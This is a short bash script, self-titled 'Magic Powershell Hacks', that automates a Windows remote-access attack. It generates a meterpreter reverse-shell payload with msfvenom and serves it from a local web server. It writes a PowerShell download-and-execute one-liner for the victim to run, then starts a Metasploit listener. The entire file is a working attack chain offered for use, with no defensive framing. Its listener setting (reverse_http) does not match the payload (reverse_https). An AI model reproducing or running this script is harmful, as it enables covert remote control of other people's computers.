#!/bin/bash

clear
echo "   ---------Magic Powershell Hacks---------
___________For Windows, Made By Bob____________
"
echo -n "Enter Name Of Wireless Card e.g. eth0 [ENTER]: "
read wcard
ip="$(/sbin/ip -o -4 addr list $wcard| awk '{print $4}' | cut -d/ -f1)"

echo "
$ip
"

echo -n "Enter Port To Be Used e.g. 4444 [ENTER]: "
read port

echo "
Deleting Old Files Created By This Script"
rm code.txt
rm shellcode.txt

echo "Creating Script"
msfvenom -p windows/x64/meterpreter/reverse_https LHOST="$ip" LPORT="$port" -f powershell > shellcode.txt

echo "Copying Scripts to /var/www/html "
cp Invoke-Shellcode.ps1 /var/www/html/
cp shellcode.txt /var/www/html/
echo "Starting Web Server"
service apache2 start
echo "Running!"
echo "Copied to http://"$ip"/Invoke-Shellcode.ps1"
echo "Generating Script For Powershell..."
echo 'IEX(New-Object Net.WebClient).DownloadString("http://'$ip:80'/Invoke-Shellcode.ps1")
IEX(New-Object Net.WebClient).DownloadString("http://'$ip:80'/shellcode.txt")
Invoke-Shellcode -Shellcode ($buf) -Force' > code.txt
echo "Saved!"
echo "Starting the postgresql Server"
service postgresql start
echo "Starting Listener for Payload"
msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_http;set LHOST $ip;set LPORT $port; exploit"
